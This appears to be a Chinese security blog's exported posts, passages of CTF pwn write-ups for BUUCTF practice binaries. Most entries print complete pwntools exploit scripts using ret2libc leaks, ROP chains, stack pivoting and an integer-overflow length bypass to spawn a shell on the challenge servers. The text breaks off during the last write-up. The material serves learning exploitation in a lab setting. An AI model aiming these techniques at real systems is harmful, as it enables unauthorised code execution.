<p>3.布置栈上的值</p>
<p><img src="/img/image-20210628221147958.png" alt="image-20210628221147958"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>

<p>第一个’aaaa‘随便输入，如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节<br>接着跟上system函数的地址<br>后面是执行完system函数后的返回地址，这边也可以随便写<br>之后是一个地址，这个地址指向的是我们写在栈上的’/bin/sh‘字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>）</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27757</span>)</span><br><span class="line"></span><br><span class="line">sys=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">main=<span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">s=ebp=u32(r.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat flag</p>
<p><img src="/img/image-20210628221613459.png" alt="image-20210628221613459"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_c_1</title>
    <url>/2021/06/28/ciscn-2019-c-1/</url>
    <content><![CDATA[<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210429213629885.png" alt="image-20210429213629885"></p>
<p>IDA打开后F5查看main函数</p>
<p><img src="/img/image-20210423214542261.png" alt="image-20210423214542261"></p>
<p>发现没有之前做的gets()栈溢出，但是发现了一个encrypt函数，点开之后查看，找到了gets函数</p>
<p><img src="/img/image-20210423214700799.png" alt="image-20210423214700799"></p>
<p>读得内容为gets读取输入内容进入while循环之后是由strlen检查长度，strlen是从字符串开头检测到第一个\x00截断，所以只要在payload的开头置0让strlen判断错误就可以避免对payload的破坏。</p>
<h4 id="小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过"><a href="#小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过" class="headerlink" title="小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过"></a>小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过</h4><p>但这里没有发现后门函数，于是只能自己构造rop链。</p>
<p>puts()可以用来泄露libc基址。</p>
<p>gets()可以用来栈溢出，栈大小0x50。</p>
<p><img src="/img/image-20210430234840983.png" alt="image-20210430234840983"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span>      </span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span>      <span class="comment">#×64程序基本都存在的一个地址pop rdi；ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:	</span><br><span class="line">		p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29999</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)	</span><br><span class="line">	p.recvline()</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(puts_addr)      <span class="comment">#找出puts的地址</span></span><br><span class="line"></span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">	libc_base   = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)      <span class="comment">#找出函数地址偏移量</span></span><br><span class="line">	system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)      <span class="comment">#计算出system的在程序中的地址</span></span><br><span class="line">	binsh_addr  = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)	</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat flag</p>
<p><img src="/img/image-20210501002359709.png" alt="image-20210501002359709"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>get_started_3dsctf_2016</title>
    <url>/2021/06/17/get_started_3dsctf_2016/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>查看保护机制，32位，开了NX</p>
<p><img src="/img/image-20210425011728468.png"></p>
<p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p>
<p><img src="/img/image-20210425011933854.png"></p>
<p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p>
<p><img src="/img/image-20210425012146370.png"></p>
<p>点击a1查看到了在栈中的位置</p>
<p><img src="/img/image-20210425012353464.png"></p>
<p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p>
<p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p>
<p><img src="/img/image-20210425012826978.png"></p>
<p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p>
<p><img src="/img/image-20210425013007535.png"></p>
<p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p>
<p><img src="/img/image-20210425013149728.png"></p>
<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node3.buuoj.cn&quot; , 26419)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(<span class="number">0x80489B8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>但是没办法得到flag，这里还发现这样远程是无法连接的</p>
<p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p>
<p><img src="/img/image-20210425162841539.png"></p>
<h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26419</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">get_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(get_addr) + p32(exit_addr)</span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210425165227769.png"></p>
<p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_level3</title>
    <url>/2021/06/28/jarvisoj-level3/</url>
    <content><![CDATA[<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210628222619420.png" alt="image-20210628222619420"></p>
<p>IDA打开，shift+F12没有找到system和’/bin/sh’，所以应该也是libc泄露</p>
<p>查看main函数，又看到了熟悉的vulnerable_function()函数</p>
<p><img src="/img/image-20210628222739706.png" alt="image-20210628222739706"></p>
<p><img src="/img/image-20210628222833493.png" alt="image-20210628222833493"></p>
<p>果然漏洞就在这个函数里</p>
<p>写入长度只有7，而读的长度有0x100，漏洞很大</p>
<p>解题思路和前几个题都类似了</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.通过write函数泄露libc版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.计算libc基址，算出system和/bin/sh的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>3.构造rop，执行system(‘/bin/sh’)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28991</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x804844B</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_base+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat flag</p>
<p><img src="/img/image-20210706133135129.png" alt="image-20210706133135129"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_s_3</title>
    <url>/2021/06/28/ciscn-s-3/</url>
    <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png" alt="image-20210628173000858"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
<p><img src="/img/image-20210628173110722.png" alt="image-20210628173110722"></p>
<p>再查看vuln函数，一个sys_read,一个sys_write,写入0x400，读0x30，这里就发现栈溢出的漏洞</p>
<p><img src="/img/image-20210628173134218.png" alt="image-20210628173134218"></p>
<p>然后又发现了一个gadget函数</p>
<p><img src="/img/image-20210628173525340.png" alt="image-20210628173525340"></p>
<p><img src="/img/image-20210628174307696.png" alt="image-20210628174307696"></p>
<h3 id="这里要注意："><a href="#这里要注意：" class="headerlink" title="这里要注意："></a>这里要注意：</h3><p>  mov      rax, 15       sys_rt_sigreturn</p>
<p>  mov      rax, 59       sys_execve</p>
<p>gadget函数没有被直接调用，该函数设置了rax=15并返回，推测可能和系统调用号有关。查到ubuntu18 64位系统调用号15为<strong>rt_sigreturn</strong>，用于恢复从用户态进入内核态所保存的上下文（即寄存器信息），59为<strong>execve</strong>，作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p>
<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
<p><img src="/img/image-20210628175901200.png" alt="image-20210628175901200"></p>
<p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28640</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">execve=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">sys=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(io.recv(<span class="number">8</span>))-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload2+=p64(mov_rdxr13_call)+p64(execve)</span><br><span class="line">payload2+=p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat flag!</p>
<p><img src="/img/image-20210628181623724.png"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CURL</title>
    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>

<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>web、笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn1</title>
    <url>/2021/07/15/pwn1/</url>
    <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210715112542782.png" alt="image-20210715112542782"></p>
<p>IDA打开，查看main函数，看到vul_function()函数</p>
<p><img src="/img/image-20210715112703453.png" alt="image-20210715112703453"></p>
<p><img src="/img/image-20210715112745902.png" alt="image-20210715112745902"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">虽然buf在栈上但输入的长度仅仅能够覆盖<span class="built_in">ebp</span>和返回地址，但s在bss段，而且输入的长度也够长，因此想到了栈迁移，覆盖vul_function返回地址，使其到bss段上执行</span><br></pre></td></tr></table></figure>



<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到s在bss段中的位置是0x804A300</p>
<p><img src="/img/image-20210715113306340.png" alt="image-20210715113306340"></p>
<p>在bss段的s上需要调用system(“/bin/sh”)，但没有提供system和”/bin/sh”的地址，还需要写个ROP链，先泄露write函数的真实地址，再利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本,从而得到system和”/bin/sh”的地址。</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>注意:发现做题久了之后，libc版本的问题，如果虚拟机LibcSearcher每次搜出来的libc版本都不是想要的版本，其实有个libc-2.23就可以了，大部分题用2.23都可以跑出来，2.23yyds！</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27426</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_s = <span class="number">0x0804A300</span>				<span class="comment">#将fake栈迁移到bss中</span></span><br><span class="line">leave_ret = <span class="number">0x08048511</span>			<span class="comment">#栈迁移所需要的的地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]	<span class="comment">#plt表可以调用write函数</span></span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]	<span class="comment">#got表里有write函数的真实地址</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]	<span class="comment">#控制函数执行流需要再次回到主函数</span></span><br><span class="line"><span class="comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"><span class="comment"># 上面将一些执行流程写入了bss段</span></span><br><span class="line"><span class="comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> <span class="comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span></span><br><span class="line">payload += p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>)) <span class="comment">#接收泄露的地址</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;write&quot;, write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]<span class="comment">#获取libc的基地址</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]<span class="comment">#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))<span class="comment">#通过获取到的libc的基地址和&quot;/bin/sh&quot;在libc中的地址可以得到&quot;/bin/sh&quot;在程序中的真实地址</span></span><br><span class="line"><span class="comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span></span><br><span class="line"><span class="comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn2_sctf_2016</title>
    <url>/2021/07/06/pwn2-sctf-2016/</url>
    <content><![CDATA[<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
<p><img src="/img/image-20210627162616928.png" alt="image-20210627162616928"></p>
<p>尝试运行了一下</p>
<p><img src="/img/image-20210627162846304.png" alt="image-20210627162846304"></p>
<p>IDA打开，main函数很简单，就调用了一个vuln()函数，那就看看vuln()函数</p>
<p><img src="/img/image-20210627163205184.png" alt="image-20210627163205184"></p>
<p><img src="/img/image-20210627163308598.png" alt="image-20210627163308598"></p>
<p><img src="/img/image-20210627164147748.png" alt="image-20210627164147748"></p>
<p>读出内容限制a2输入最大字节长度为32，接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
<p>这里发现输入函数是get_n,而不是get，说明是自定义函数</p>
<p>shift+F12查找字符串，没有看见system(‘/bin/sh’)字样</p>
<p><img src="/img/image-20210627163859886.png" alt="image-20210627163859886"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.通过输入负数，绕过长度限制，造成溢出</p>
<p>2.利用printf函数泄露程序的libc版本，算出system和‘/bin/sh’的地址</p>
<p>3.溢出覆盖返回地址执行system(‘/bin/sh’)，夺权</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>整数溢出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>泄露libc</p>
